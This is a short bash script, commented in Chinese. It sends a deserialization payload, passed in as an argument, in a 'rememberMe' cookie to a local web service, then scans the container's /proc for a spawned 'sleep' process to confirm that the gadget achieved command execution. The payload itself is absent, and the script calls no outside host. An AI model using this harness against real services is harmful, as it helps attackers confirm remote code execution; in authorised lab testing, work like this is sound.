#!/bin/bash
# loop3 t7 C1 — 决定性判定：容器内 /proc 观察 gadget 是否真的执行了命令
# 原理：Runtime.exec 会 fork 出子进程。若 gadget 生效，容器 /proc 里会出现 sleep 进程。
#       全程只读命令（sleep 是只读无害命令），不写文件、不联网、不反弹 shell。
CK="$1"
LABEL="$2"
echo "=== [$LABEL] cookie_len=${#CK} ==="
# 1) 基线进程快照
before=$(ls /proc | grep -E '^[0-9]+$' | wc -l)
echo "proc_count_before=$before"
# 2) 后台发请求（带 payload）
( curl -s -o /dev/null -m 40 -H "Cookie: rememberMe=$CK" http://127.0.0.1:8080/ ; echo "req_done" ) &
REQPID=$!
# 3) 在请求进行中反复扫描 /proc 找 sleep
found=0
for i in $(seq 1 40); do
  for p in $(ls /proc 2>/dev/null | grep -E '^[0-9]+$'); do
    if [ -r /proc/$p/cmdline ]; then
      cl=$(tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null)
      case "$cl" in
        *sleep*) echo "FOUND_PROC pid=$p cmd=$cl"; found=$((found+1));;
      esac
    fi
  done
  sleep 0.2
done
wait $REQPID 2>/dev/null
echo "sleep_procs_found=$found"
after=$(ls /proc | grep -E '^[0-9]+$' | wc -l)
echo "proc_count_after=$after"
echo "=== [$LABEL] DONE ==="
